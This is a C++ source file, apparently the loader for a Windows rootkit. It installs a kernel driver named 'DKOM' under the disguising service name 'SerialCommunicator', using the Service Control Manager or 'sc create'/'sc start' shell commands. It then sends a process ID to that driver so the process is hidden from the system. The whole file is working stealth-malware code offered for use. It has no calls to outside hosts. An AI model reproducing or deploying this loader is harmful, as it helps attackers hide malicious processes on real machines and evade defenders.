//#include <stdio.h>
#include <windows.h>
//#include <stdlib.h>
//#include <string.h>
#include <iostream>
#include "log.h"

namespace Logs
{
	Log* log;
}

bool loadSysFileSCM(char* driverName, char* displayName);
bool cmdLoadSysFile(char* driverName, char* displayName);
bool tryLoadSysFile(char* driverName, char* displayName);
bool hideProcess(char* driverName, int pid);

#if defined _DEBUG || defined TRUE
#define DEBUG
#endif

#ifdef DEBUG
#define TRY_LOAD
#else // RELEASE
#define SCM_LOAD
#endif

#ifdef TRY_LOAD
#define loadSysFile tryLoadSysFile
#elif defined SCM_LOAD
#define loadSysFile loadSysFileSCM
#else // CMD_LOAD
#define loadSysFile cmdLoadSysFile
#endif

int main(int argc, char *argv[])
{
	Logs::log = new Log();
	Logs::log->WriteLine("\n\nstarted...\n");
	if (argc < 2)
	{
		printf("Not enougth arguments");
		return 0;
	}
	char* driverName = "DKOM";
	char* displayName = "SerialCommunicator"; // friendly name
#ifdef DEBUG
	char buff[200];
	sprintf(buff, "sc stop %s", driverName);
	system(buff);
	sprintf(buff, "sc delete %s", driverName);
	system(buff);
#endif
	if (loadSysFile(driverName, displayName) && hideProcess(displayName, atoi(argv[1]))) // atoi = string argument to integer
		printf("success\n");
	else
		printf("failure\n");
	char s[100];
	std::cin >> s;

	return 0;
}

#pragma region loadSysFile

bool loadSysFileSCM(char* driverName, char* displayName) // load manually with scm
{
	printf("loading via SCM\n");
	Logs::log->WriteLine("loading via SCM");
	char* frmtStr = new char[1024];
	// Open a handle to the SCM
	SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!scmHandle)
	{
		sprintf(frmtStr, "failed to open SCM(%d)\n", GetLastError());
		Logs::log->WriteLine(frmtStr);
		printf(frmtStr);
		return FALSE;
	}

	char currDir[515];
	GetCurrentDirectory(512, currDir); // get the .sys file location
	char path[1000];
	snprintf(path, 998, "%s\\%s.sys", currDir, driverName); // string formatting
	sprintf(frmtStr, "loading %s\n", path);
	Logs::log->Write(frmtStr);
	printf(frmtStr);
	
	SC_HANDLE driverHandle = CreateService(scmHandle, // Handle to SCManager
		driverName, // Service Name
		displayName, // Display Name
		SERVICE_ALL_ACCESS, // Desired Access
		SERVICE_KERNEL_DRIVER, // Service Type
		SERVICE_DEMAND_START, // Start Type
		SERVICE_ERROR_NORMAL, // Error Controle
		path, // Binary Path Name
		NULL, // Load OrderGroup
		NULL, // Tag Id
		NULL, // Dependencies
		NULL, // Service Start Name
		NULL); // Password

	if (!driverHandle)
	{
		if (GetLastError() == ERROR_SERVICE_EXISTS)// || GetLastError() == ERROR_ALREADY_EXISTS)
		{ // Service exists
			Logs::log->Write("service exists\n");
			printf("service exists\n");
			driverHandle = OpenService(scmHandle, driverName, SERVICE_ALL_ACCESS); // get a handle to the existing service handle
			if (!driverHandle)
			{
				sprintf(frmtStr, "couldn't get existing service handle(%d)\n", GetLastError());
				Logs::log->Write(frmtStr);
				printf(frmtStr);
				CloseServiceHandle(scmHandle);
				return FALSE;
			}
		}
		else
		{
			sprintf(frmtStr, "couldn't start service(%d)\n", GetLastError());
			Logs::log->Write(frmtStr);
			printf(frmtStr);
			CloseServiceHandle(scmHandle);
			return FALSE;
		}
	}
	sprintf(frmtStr, "driverHandle handled (%d)", driverHandle);
	Logs::log->WriteLine(frmtStr);
	printf(frmtStr);

	// start the Driver
	if (0 == StartService(driverHandle, 0, NULL) && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING)
	{
		sprintf(frmtStr, "couldn't start driver(%d)\n", GetLastError());
		Logs::log->Write(frmtStr);
		printf(frmtStr);
		CloseServiceHandle(scmHandle);
		CloseServiceHandle(driverHandle);
		return FALSE;
	}
	Logs::log->WriteLine("closing handles");
	printf("closing handles\n");
	CloseServiceHandle(scmHandle);
	CloseServiceHandle(driverHandle);
	return TRUE;
}

bool cmdLoadSysFile(char* driverName, char* displayName) // load with cmd command
{
	Logs::log->WriteLine("loading via cmd");
	printf("loading via cmd\n");

	// get .sys file location
	char currDir[515];
	GetCurrentDirectory(512, currDir); // get the .sys file location
	char path[1000];
	snprintf(path, 998, "%s\\%s.sys", currDir, driverName); // string formatting
	char frmtStr[1024];
	sprintf(frmtStr, "loading %s\n", path);
	Logs::log->Write(frmtStr);
	printf(frmtStr);

	char buff[1024];
	//sc create[service name] binPath = [path to your.sys file] type = kernel
	sprintf(buff, "sc create %s binPath=%s type=kernel", displayName, path);
	sprintf(frmtStr, "command: \"%s\"\n", buff);
	Logs::log->Write(frmtStr);
	printf(frmtStr);
	int ret = system(buff); // execute as cmd command
	if (ret) // if returns 0 its ok
	{
		sprintf(frmtStr, "could not load driver (%d), lasterr: (%d)\n", ret, GetLastError());
		Logs::log->Write(frmtStr);
		printf(frmtStr);
		return FALSE;
	}
	//sc start[service name]
	sprintf(buff, "sc start %s", displayName);
	sprintf(frmtStr, "command: \"%s\"\n", buff);
	Logs::log->Write(frmtStr);
	printf(frmtStr);
	ret = system(buff);
	if (ret) // if returns 0 its ok
	{
		sprintf(frmtStr, "could not start service (%d), lasterr: (%d)\n", ret, GetLastError());
		Logs::log->Write(frmtStr);
		printf(frmtStr);
		return FALSE;
	}
	return TRUE;
}

bool tryLoadSysFile(char * driverName, char * displayName)
{
	//if (loadSysFileSCM(driverName, displayName) || cmdLoadSysFile(driverName, displayName))
	//	return TRUE;
	//return FALSE;
	return loadSysFileSCM(driverName, displayName) || cmdLoadSysFile(driverName, displayName);
}

#pragma endregion

bool hideProcess(char * driverName, int pid)
{
	char* driverToOpen = new char[100];
	sprintf(driverToOpen, "\\\\.\\%s", driverName); // "\\\\.\\DKOM" for example
	HANDLE hFile = CreateFile(driverToOpen, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); // open driver

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Error: Unable to connect to the driver (%d)\nMake sure the driver is loaded.\n", GetLastError());
		return FALSE;
	}
	DWORD write;
	if (!WriteFile(hFile, &pid, sizeof(DWORD), &write, NULL)) // hide
	{
		printf("\nError: Unable to hide process (%d)\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}